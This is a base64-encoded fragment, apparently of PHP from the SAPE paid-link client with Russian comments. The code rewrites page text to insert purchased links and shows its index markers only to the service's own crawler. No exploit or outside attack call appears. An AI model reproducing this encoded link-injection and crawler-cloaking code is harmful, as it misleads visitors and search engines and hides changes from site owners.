gICAkc291cmNlX3NlbnRlbmNlcyA9IGFycmF5KCk7CgogICAgICAgICAgICAvL9Ch0L7Qt9C00LDQtdC8INC80LDRgdGB0LjQsiDQuNGB0YXQvtC00L3Ri9GFINGC0LXQutGB0YLQvtCyINC00LvRjyDQt9Cw0LzQtdC90YsKICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPl93b3Jkc19wYWdlIGFzICRuID0+ICRzZW50ZW5jZSkgewogICAgICAgICAgICAgICAgLy/Ql9Cw0LzQtdC90Y/QtdC8INCy0YHQtSDRgdGD0YnQvdC+0YHRgtC4INC90LAg0YHQuNC80LLQvtC70YsKICAgICAgICAgICAgICAgICRzcGVjaWFsX2NoYXJzID0gYXJyYXkoCiAgICAgICAgICAgICAgICAgICAgJyZhbXA7JyAgPT4gJyYnLAogICAgICAgICAgICAgICAgICAgICcmcXVvdDsnID0+ICciJywKICAgICAgICAgICAgICAgICAgICAnJiMwMzk7JyA9PiAnXCcnLAogICAgICAgICAgICAgICAgICAgICcmbHQ7JyAgID0+ICc8JywKICAgICAgICAgICAgICAgICAgICAnJmd0OycgICA9PiAnPicKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAkc2VudGVuY2UgICAgICA9IHN0cmlwX3RhZ3MoJHNlbnRlbmNlKTsKICAgICAgICAgICAgICAgICRzZW50ZW5jZSAgICAgID0gc3RyaXBfdGFncygkc2VudGVuY2UpOwogICAgICAgICAgICAgICAgJHNlbnRlbmNlICAgICAgPSBzdHJfcmVwbGFjZShhcnJheV9rZXlzKCRzcGVjaWFsX2NoYXJzKSwgYXJyYXlfdmFsdWVzKCRzcGVjaWFsX2NoYXJzKSwgJHNlbnRlbmNlKTsKCiAgICAgICAgICAgICAgICAvL9Cf0YDQtdC+0LHRgNCw0LfRg9C10Lwg0LLRgdC1INGB0L/QtdGGINGB0LjQvNCy0L7Qu9GLINCyINGB0YPRidC90L7RgdGC0LgKICAgICAgICAgICAgICAgICRodHNjX2NoYXJzZXQgPSBlbXB0eSgkdGhpcy0+X2NoYXJzZXQpID8gJ3dpbmRvd3MtMTI1MScgOiAkdGhpcy0+X2NoYXJzZXQ7CiAgICAgICAgICAgICAgICAkcXVvdGVfc3R5bGUgID0gRU5UX0NPTVBBVDsKICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc1LjQuMCcpID49IDApIHsKICAgICAgICAgICAgICAgICAgICAkcXVvdGVfc3R5bGUgPSBFTlRfQ09NUEFUIHwgRU5UX0hUTUw0MDE7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJHNlbnRlbmNlID0gaHRtbHNwZWNpYWxjaGFycygkc2VudGVuY2UsICRxdW90ZV9zdHlsZSwgJGh0c2NfY2hhcnNldCk7CgogICAgICAgICAgICAgICAgLy/QmtCy0L7RgtC40YDRg9C10LwKICAgICAgICAgICAgICAgICRzZW50ZW5jZSAgICAgID0gcHJlZ19xdW90ZSgkc2VudGVuY2UsICcvJyk7CiAgICAgICAgICAgICAgICAkcmVwbGFjZV9hcnJheSA9IGFycmF5KCk7CiAgICAgICAgICAgICAgICBpZiAocHJlZ19tYXRjaF9hbGwoJy8oJlsjYS16QS1aMC05XXsyLDZ9OykvaXNVJywgJHNlbnRlbmNlLCAkb3V0KSkgewogICAgICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAkaSA8IGNvdW50KCRvdXRbMV0pOyAkaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICR1bnNwZWMgICAgICAgICAgICAgICAgID0gJHNwZWNpYWxfY2hhcnNbJG91dFsxXVskaV1dOwogICAgICAgICAgICAgICAgICAgICAgICAkcmVhbCAgICAgICAgICAgICAgICAgICA9ICRvdXRbMV1bJGldOwogICAgICAgICAgICAgICAgICAgICAgICAkcmVwbGFjZV9hcnJheVskdW5zcGVjXSA9ICRyZWFsOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8v0JfQsNC80LXQvdGP0LXQvCDRgdGD0YnQvdC+0YHRgtC4INC90LAg0JjQm9CYICjRgdGD0YnQvdC+0YHRgtGMfNGB0LjQvNCy0L7QuykKICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRyZXBsYWNlX2FycmF5IGFzICR1bnNwZWMgPT4gJHJlYWwpIHsKICAgICAgICAgICAgICAgICAgICAkc2VudGVuY2UgPSBzdHJfcmVwbGFjZSgkcmVhbCwgJygoJyAuICRyZWFsIC4gJyl8KCcgLiAkdW5zcGVjIC4gJykpJywgJHNlbnRlbmNlKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8v0JfQsNC80LXQvdGP0LXQvCDQv9GA0L7QsdC10LvRiyDQvdCwINC/0LXRgNC10L3QvtGB0Ysg0LjQu9C4INGB0YPRidC90L7RgdGC0Lgg0L/RgNC+0LHQtdC70L7QsgogICAgICAgICAgICAgICAgJHNvdXJjZV9zZW50ZW5jZXNbJG5dID0gc3RyX3JlcGxhY2UoJyAnLCAnKChccyl8KCZuYnNwOykpKycsICRzZW50ZW5jZSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR0aGlzLT5fZGVidWdfYWN0aW9uX2FwcGVuZCgkc291cmNlX3NlbnRlbmNlcywgJ3NlbnRlbmNlcyBmb3IgcmVwbGFjZScpOwoKICAgICAgICAgICAgLy/QtdGB0LvQuCDRjdGC0L4g0L/QtdGA0LLRi9C5INC60YPRgdC+0LosINGC0L4g0L3QtSDQsdGD0LTQtdC8INC00L7QsdCw0LLQu9GP0YLRjCA8CiAgICAgICAgICAgICRmaXJzdF9wYXJ0ID0gdHJ1ZTsKICAgICAgICAgICAgLy/Qv9GD0YHRgtCw0Y8g0L/QtdGA0LXQvNC10L3QvdCw0Y8g0LTQu9GPINC30LDQv9C40YHQuAoKICAgICAgICAgICAgaWYgKGNvdW50KCRzb3VyY2Vfc2VudGVuY2VzKSA+IDApIHsKCiAgICAgICAgICAgICAgICAkY29udGVudCAgID0gJyc7CiAgICAgICAgICAgICAgICAkb3Blbl90YWdzID0gYXJyYXkoKTsgLy/QntGC0LrRgNGL0YLRi9C1INC30LDQsdCw0L3QtdC90YvQtSDRgtGN0LPQuAogICAgICAgICAgICAgICAgJGNsb3NlX3RhZyA9ICcnOyAvL9Cd0LDQt9Cy0LDQvdC40LUg0YLQtdC60YPRidC10LPQviDQt9Cw0LrRgNGL0LLQsNGO0YnQtdCz0L4g0YLRjdCz0LAKCiAgICAgICAgICAgICAgICAvL9Cg0LDQt9Cx0LjQstCw0LXQvCDQv9C+INGB0LjQvNCy0L7Qu9GDINC90LDRh9Cw0LvQsCDRgtC10LPQsAogICAgICAgICAgICAgICAgJHBhcnQgPSBzdHJ0b2soJyAnIC4gJHRleHQsICc8Jyk7CgogICAgICAgICAgICAgICAgd2hpbGUgKCRwYXJ0ICE9PSBmYWxzZSkgewogICAgICAgICAgICAgICAgICAgIC8v0J7Qv9GA0LXQtNC10LvRj9C10Lwg0L3QsNC30LLQsNC90LjQtSDRgtGN0LPQsAogICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvKD9zaSleKFwvP1thLXowLTldKykvJywgJHBhcnQsICRtYXRjaGVzKSkgewogICAgICAgICAgICAgICAgICAgICAgICAvL9Ce0L/RgNC10LTQtdC70Y/QtdC8INC90LDQt9Cy0LDQvdC40LUg0YLQtdCz0LAKICAgICAgICAgICAgICAgICAgICAgICAgJHRhZ19uYW1lID0gc3RydG9sb3dlcigkbWF0Y2hlc1sxXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIC8v0J7Qv9GA0LXQtNC10LvRj9C10Lwg0LfQsNC60YDRi9Cy0LDRjtGJ0LjQuSDQu9C4INGC0Y3QswogICAgICAgICAgICAgICAgICAgICAgICBpZiAoc3Vic3RyKCR0YWdfbmFtZSwgMCwgMSkgPT0gJy8nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY2xvc2VfdGFnID0gc3Vic3RyKCR0YWdfbmFtZSwgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+X2RlYnVnX2FjdGlvbl9hcHBlbmQoJGNsb3NlX3RhZywgJ2Nsb3NlIHRhZycpOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNsb3NlX3RhZyA9ICcnOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25fYXBwZW5kKCR0YWdfbmFtZSwgJ29wZW4gdGFnJyk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJGNudF90YWdzID0gY291bnQoJG9wZW5fdGFncyk7CiAgICAgICAgICAgICAgICAgICAgICAgIC8v0JXRgdC70Lgg0LfQsNC60YDRi9Cy0LDRjtGJ0LjQuSDRgtC10LMg0YHQvtCy0L/QsNC00LDQtdGCINGBINGC0LXQs9C+0Lwg0LIg0YHRgtC10LrQtSDQvtGC0LrRgNGL0YLRi9GFINC30LDQv9GA0LXRidC10L3QvdGL0YUg0YLQtdCz0L7QsgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKCRjbnRfdGFncyA+IDApICYmICgkb3Blbl90YWdzWyRjbnRfdGFncyAtIDFdID09ICRjbG9zZV90YWcpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcnJheV9wb3AoJG9wZW5fdGFncyk7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25fYXBwZW5kKCR0YWdfbmFtZSwgJ2RlbGV0ZWQgZnJvbSBvcGVuX3RhZ3MnKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGNudF90YWdzIC0gMSA9PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25fYXBwZW5kKCdzdGFydCByZXBsYWNlbWVudCcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAvL9CV0YHQu9C4INC90LXRgiDQvtGC0LrRgNGL0YLRi9GFINC/0LvQvtGF0LjRhSDRgtC10LPQvtCyLCDRgtC+INC+0LHRgNCw0LHQsNGC0YvQstCw0LXQvAogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY291bnQoJG9wZW5fdGFncykgPT0gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy/QtdGB0LvQuCDQvdC1INC30LDQv9GA0LXRidC10L3QvdGL0Lkg0YLRjdCzLCDRgtC+INC90LDRh9C40L3QsNC10Lwg0L7QsdGA0LDQsdC+0YLQutGDCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWluX2FycmF5KCR0YWdfbmFtZSwgJHRoaXMtPl9maWx0ZXJfdGFncykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3BsaXRfcGFydHMgPSBleHBsb2RlKCc+JywgJHBhcnQsIDIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8v0J/QtdGA0LXRgdGC0YDQsNGF0L7QstGL0LLQsNC10LzRgdGPCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNvdW50KCRzcGxpdF9wYXJ0cykgPT0gMikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL9Cd0LDRh9C40L3QsNC10Lwg0L/QtdGA0LXQsdC+0YAg0YTRgNCw0Lcg0LTQu9GPINC30LDQvNC10L3RiwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkc291cmNlX3NlbnRlbmNlcyBhcyAkbiA9PiAkc2VudGVuY2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvJyAuICRzZW50ZW5jZSAuICcvJywgJHNwbGl0X3BhcnRzWzFdKSA9PSAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNwbGl0X3BhcnRzWzFdID0gcHJlZ19yZXBsYWNlKCcvJyAuICRzZW50ZW5jZSAuICcvJywgc3RyX3JlcGxhY2UoJyQnLCAnXCQnLCAkdGhpcy0+X3dvcmRzX3BhZ2VbJG5dKSwgJHNwbGl0X3BhcnRzWzFdLCAxKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25fYXBwZW5kKCRzZW50ZW5jZSAuICcgLS0tICcgLiAkdGhpcy0+X3dvcmRzX3BhZ2VbJG5dLCAncmVwbGFjZWQnKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy/QldGB0LvQuCDQt9Cw0LzQtdC90LjQu9C4LCDRgtC+INGD0LTQsNC70Y/QtdC8INGB0YLRgNC+0YfQutGDINC40Lcg0YHQv9C40YHQutCwINC30LDQvNC10L3RiwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuc2V0KCRzb3VyY2Vfc2VudGVuY2VzWyRuXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdW5zZXQoJHRoaXMtPl93b3Jkc19wYWdlWyRuXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhcnQgPSAkc3BsaXRfcGFydHNbMF0gLiAnPicgLiAkc3BsaXRfcGFydHNbMV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuc2V0KCRzcGxpdF9wYXJ0cyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL9CV0YHQu9C4INGDINC90LDRgSDQt9Cw0L/RgNC10YnQtdC90YvQuSDRgtGN0LMsINGC0L4g0L/QvtC80LXRidCw0LXQvCDQtdCz0L4g0LIg0YHRgtC10Log0L7RgtC60YDRi9GC0YvRhQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRvcGVuX3RhZ3NbXSA9ICR0YWdfbmFtZTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25fYXBwZW5kKCR0YWdfbmFtZSwgJ2FkZGVkIHRvIG9wZW5fdGFncywgc3RvcCByZXBsYWNlbWVudCcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlaWYgKGNvdW50KCRvcGVuX3RhZ3MpID09IDApIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy/QldGB0LvQuCDQvdC10YIg0L3QsNC30LLQsNC90LjRjyDRgtC10LPQsCwg0YLQviDRgdGH0LjRgtCw0LXQvCwg0YfRgtC+INC/0LXRgNC10LQg0L3QsNC80Lgg0YLQtdC60YHRggogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkc291cmNlX3NlbnRlbmNlcyBhcyAkbiA9PiAkc2VudGVuY2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvJyAuICRzZW50ZW5jZSAuICcvJywgJHBhcnQpID09IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHByZWdfcmVwbGFjZSgnLycgLiAkc2VudGVuY2UgLiAnLycsIHN0cl9yZXBsYWNlKCckJywgJ1wkJywgJHRoaXMtPl93b3Jkc19wYWdlWyRuXSksICRwYXJ0LCAxKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25fYXBwZW5kKCRzZW50ZW5jZSAuICcgLS0tICcgLiAkdGhpcy0+X3dvcmRzX3BhZ2VbJG5dLCAncmVwbGFjZWQnKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy/QldGB0LvQuCDQt9Cw0LzQtdC90LjQu9C4LCDRgtC+INGD0LTQsNC70Y/QtdC8INGB0YLRgNC+0YfQutGDINC40Lcg0YHQv9C40YHQutCwINC30LDQvNC10L3RiywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL9GH0YLQvtCx0Ysg0LHRi9C70L4g0LzQvtC20L3QviDQtNC10LvQsNGC0Ywg0LzQvdC+0LbQtdGB0YLQstC10L3QvdGL0Lkg0LLRi9C30L7QsgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVuc2V0KCRzb3VyY2Vfc2VudGVuY2VzWyRuXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdW5zZXQoJHRoaXMtPl93b3Jkc19wYWdlWyRuXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIC8v0JXRgdC70Lgg0Y3RgtC+INC/0LXRgNCy0LDRjyDRh9Cw0YHRgtGMLCDRgtC+INC90LUg0LLRi9Cy0L7QtNC40LwgPAogICAgICAgICAgICAgICAgICAgIGlmICgkZmlyc3RfcGFydCkgewogICAgICAgICAgICAgICAgICAgICAgICAkY29udGVudCAuPSAkcGFydDsKICAgICAgICAgICAgICAgICAgICAgICAgJGZpcnN0X3BhcnQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkY29udGVudCAuPSAnPCcgLiAkcGFydDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgLy/Qn9C+0LvRg9GH0LDQtdC8INGB0LvQtdC00YPRjtGJ0YMg0YfQsNGB0YLRjAogICAgICAgICAgICAgICAgICAgIHVuc2V0KCRwYXJ0KTsKICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHN0cnRvaygnPCcpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRleHQgPSBsdHJpbSgkY29udGVudCk7CiAgICAgICAgICAgICAgICB1bnNldCgkY29udGVudCk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+X2RlYnVnX2FjdGlvbl9hcHBlbmQoJ05vIHdvcmRcJ3MgZm9yIHBhZ2UnKTsKICAgICAgICB9CgogICAgICAgIGlmICgkdGhpcy0+X2lzX291cl9ib3QgfHwgJHRoaXMtPl9mb3JjZV9zaG93X2NvZGUgfHwgJHRoaXMtPl9kZWJ1ZykgewogICAgICAgICAgICAkdGV4dCA9ICc8c2FwZV9pbmRleD4nIC4gJHRleHQgLiAnPC9zYXBlX2luZGV4Pic7CiAgICAgICAgICAgIGlmIChpc3NldCgkdGhpcy0+X3dvcmRzWydfX3NhcGVfbmV3X3VybF9fJ10pICYmIHN0cmxlbigkdGhpcy0+X3dvcmRzWydfX3NhcGVfbmV3X3VybF9fJ10pKSB7CiAgICAgICAgICAgICAgICAkdGV4dCAuPSAkdGhpcy0+X3dvcmRzWydfX3NhcGVfbmV3X3VybF9fJ107CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmIChjb3VudCgkdGhpcy0+X3dvcmRzX3BhZ2UpID4gMCkgewogICAgICAgICAgICAkdGhpcy0+X2RlYnVnX2FjdGlvbl9hcHBlbmQoJHRoaXMtPl93b3Jkc19wYWdlLCAnTm90IHJlcGxhY2VkJyk7CiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+X2RlYnVnX2FjdGlvbl9hcHBlbmQoJ0VORDogcmVwbGFjZV9pbl90ZXh0X3NlZ21lbnQoKScpOwoKICAgICAgICAkdGV4dCAuPSAkdGhpcy0+X2RlYnVnX2FjdGlvbl9vdXRwdXQoKTsKCiAgICAgICAgcmV0dXJuICR0ZXh0OwogICAgfQoKICAgIC8qKgogICAgICog0JfQsNC80LXQvdCwINGB0LvQvtCyCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiByZXBsYWNlX2luX3BhZ2UoJGJ1ZmZlcikKICAgIHsKCiAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25fc3RhcnQoKTsKICAgICAgICAkdGhpcy0+X2RlYnVnX2FjdGlvbl9hcHBlbmQoJ1NUQVJUOiByZXBsYWNlX2luX3BhZ2UoKScpOwoKICAgICAgICAkc19nbG9iYWxzID0gbmV3IFNBUEVfZ2xvYmFscygpOwoKICAgICAgICBpZiAoISRzX2dsb2JhbHMtPnBhZ2Vfb2JsaWdhdG9yeV9vdXRwdXRfc2hvd24oKQogICAgICAgICAgICAmJiBpc3NldCgkdGhpcy0+X3BhZ2Vfb2JsaWdhdG9yeV9vdXRwdXQpCiAgICAgICAgICAgICYmICFlbXB0eSgkdGhpcy0+X3BhZ2Vfb2JsaWdhdG9yeV9vdXRwdXQpCiAgICAgICAgKSB7CgogICAgICAgICAgICAkc3BsaXRfY29udGVudCA9IHByZWdfc3BsaXQoJy8oP3NtaSkoPFwvP2JvZHlbXj5dKj4pLycsICRidWZmZXIsIC0xLCBQUkVHX1NQTElUX0RFTElNX0NBUFRVUkUpOwogICAgICAgICAgICBpZiAoY291bnQoJHNwbGl0X2NvbnRlbnQpID09IDUpIHsKICAgICAgICAgICAgICAgICRidWZmZXIgPSAkc3BsaXRfY29udGVudFswXSAuICRzcGxpdF9jb250ZW50WzFdIC4gJHNwbGl0X2NvbnRlbnRbMl0KICAgICAgICAgICAgICAgICAgICAgICAgICAuIChmYWxzZSA9PSAkdGhpcy0+X3Nob3dfY291bnRlcl9zZXBhcmF0ZWx5ID8gJHRoaXMtPl9yZXR1cm5fb2JsaWdhdG9yeV9wYWdlX2NvbnRlbnQoKSA6ICcnKQogICAgICAgICAgICAgICAgICAgICAgICAgIC4gJHNwbGl0X2NvbnRlbnRbM10gLiAkc3BsaXRfY29udGVudFs0XTsKICAgICAgICAgICAgICAgIHVuc2V0KCRzcGxpdF9jb250ZW50KTsKCiAgICAgICAgICAgICAgICAkc19nbG9iYWxzLT5wYWdlX29ibGlnYXRvcnlfb3V0cHV0X3Nob3duKHRydWUpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBpZiAoY291bnQoJHRoaXMtPl93b3Jkc19wYWdlKSA+IDApIHsKICAgICAgICAgICAgLy/RgNCw0LfQsdC40LLQsNC10Lwg0YHRgtGA0L7QutGDINC/0L4gc2FwZV9pbmRleAogICAgICAgICAgICAvL9Cf0YDQvtCy0LXRgNGP0LXQvCDQtdGB0YLRjCDQu9C4INGC0LXQs9C4IHNhcGVfaW5kZXgKICAgICAgICAgICAgJHNwbGl0X2NvbnRlbnQgPSBwcmVnX3NwbGl0KCcvKD9zbWkpKDxcLz9zYXBlX2luZGV4PikvJywgJGJ1ZmZlciwgLTEpOwogICAgICAgICAgICAkY250X3BhcnRzICAgICA9IGNvdW50KCRzcGxpdF9jb250ZW50KTsKICAgICAgICAgICAgaWYgKCRjbnRfcGFydHMgPiAxKSB7CiAgICAgICAgICAgICAgICAvL9CV0YHQu9C4INC10YHRgtGMINGF0L7RgtGMINC+0LTQvdCwINC/0LDRgNCwIHNhcGVfaW5kZXgsINGC0L4g0L3QsNGH0LjQvdCw0LXQvCDRgNCw0LHQvtGC0YMKICAgICAgICAgICAgICAgIGlmICgkY250X3BhcnRzID49IDMpIHsKICAgICAgICAgICAgICAgICAgICBmb3IgKCRpID0gMTsgJGkgPCAkY250X3BhcnRzOyAkaSA9ICRpICsgMikgewogICAgICAgICAgICAgICAgICAgICAgICAkc3BsaXRfY29udGVudFskaV0gPSAkdGhpcy0+cmVwbGFjZV9pbl90ZXh0X3NlZ21lbnQoJHNwbGl0X2NvbnRlbnRbJGldKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkYnVmZmVyID0gaW1wbG9kZSgnJywgJHNwbGl0X2NvbnRlbnQpOwoKICAgICAgICAgICAgICAgICR0aGlzLT5fZGVidWdfYWN0aW9uX2FwcGVuZCgkY250X3BhcnRzLCAnU3BsaXQgYnkgU2FwZV9pbmRleCBjbnRfcGFydHM9Jyk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAvL9CV0YHQu9C4INC90LUg0L3QsNGI0LvQuCBzYXBlX2luZGV4LCDRgtC+INC/0YDQvtCx0YPQtdC8INGA0LDQt9Cx0LjRgtGMINC/0L4gQk9EWQogICAgICAgICAgICAgICAgJHNwbGl0X2NvbnRlbnQgPSBwcmVnX3NwbGl0KCcvKD9zbWkpKDxcLz9ib2R5W14+XSo+KS8nLCAkYnVmZmVyLCAtMSwgUFJFR19TUExJVF9ERUxJTV9DQVBUVVJFKTsKICAgICAgICAgICAgICAgIC8v0JXRgdC70Lgg0L3QsNGI0LvQuCDRgdC+0LTQtdGA0LbQuNC80L7QtSDQvNC10LbQtNGDIGJvZHkKICAgICAgICAgICAgICAgIGlmIChjb3VudCgkc3BsaXRfY29udGVudCkgPT0gNSkgewogICAgICAgICAgICAgICAgICAgICRzcGxpdF9jb250ZW50WzBdID0gJHNwbGl0X2NvbnRlbnRbMF0gLiAkc3BsaXRfY29udGVudFsxXTsKICAgICAgICAgICAgICAgICAgICAkc3BsaXRfY29udGVudFsxXSA9ICR0aGlzLT5yZXBsYWNlX2luX3RleHRfc2VnbWVudCgkc3BsaXRfY29udGVudFsyXSk7CiAgICAgICAgICAgICAgICAgICAgJHNwbGl0X2NvbnRlbnRbMl0gPSAkc3BsaXRfY29udGVudFszXSAuICRzcGxpdF9jb250ZW50WzRdOwogICAgICAgICAgICAgICAgICAgIHVuc2V0KCRzcGxpdF9jb250ZW50WzNdKTsKICAgICAgICAgICAgICAgICAgICB1bnNldCgkc3BsaXRfY29udGVudFs0XSk7CiAgICAgICAgICAgICAgICAgICAgJGJ1ZmZlciA9ICRzcGxpdF9jb250ZW50WzBdIC4gJHNwbGl0X2NvbnRlbnRbMV0gLiAkc3BsaXRfY29udGVudFsyXTsKCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25fYXBwZW5kKCdTcGxpdCBieSBCT0RZJyk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIC8v0JXRgdC70Lgg0L3QtSDQvdCw0YjQu9C4IHNhcGVfaW5kZXgg0Lgg0L3QtSDRgdC80L7Qs9C70Lgg0YDQsNC30LHQuNGC0Ywg0L/QviBib2R5CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25fYXBwZW5kKCdDYW5ub3Qgc3BsaXQgYnkgQk9EWScpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKCEkdGhpcy0+X2lzX291cl9ib3QgJiYgISR0aGlzLT5fZm9yY2Vfc2hvd19jb2RlICYmICEkdGhpcy0+X2RlYnVnKSB7CiAgICAgICAgICAgICAgICAkYnVmZmVyID0gcHJlZ19yZXBsYWNlKCcvKD9zbWkpKDxcLz9zYXBlX2luZGV4PikvJywgJycsICRidWZmZXIpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaWYgKGlzc2V0KCR0aGlzLT5fd29yZHNbJ19fc2FwZV9uZXdfdXJsX18nXSkgJiYgc3RybGVuKCR0aGlzLT5fd29yZHNbJ19fc2FwZV9uZXdfdXJsX18nXSkpIHsKICAgICAgICAgICAgICAgICAgICAkYnVmZmVyIC49ICR0aGlzLT5fd29yZHNbJ19fc2FwZV9uZXdfdXJsX18nXTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgJHRoaXMtPl9kZWJ1Z19hY3Rpb25fYXBwZW5kKCdObyB3b3JkXCdzIGZvciBwYWdlJyk7CiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+X2RlYnVnX2FjdGlvbl9hcHBlbmQoJ1NUT1A6IHJlcGxhY2VfaW5fcGFnZSgpJyk7CiAgICAgICAgJGJ1ZmZlciAuPSAkdGhpcy0+X2RlYnVnX2FjdGlvbl9vdXRwdXQoKTsKCiAgICAgICAgcmV0dXJuICRidWZmZXI7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9nZXRfZGJfZmlsZSgpCiAgICB7CiAgICAgICAgaWYgKCR0aGlzLT5fbXVsdGlfc2l0ZSkgewogICAgICAgICAgICByZXR1cm4gZGlybmFtZShfX0ZJTEVfXykgLiAnLycgLiAkdGhpcy0+X2hvc3QgLiAnLndvcmRzLmRiJzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gZGlybmFtZShfX0ZJTEVfXykgLiAnL3dvcmRzLmRiJzsKICAgICAgICB9CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9nZXRfZGlzcGVuc2VyX3BhdGgoKQogICAgewogICAgICAgIHJldHVybiAnL2NvZGVfY29udGV4dC5waHA/dXNlcj0nIC4gX1NBUEVfVVN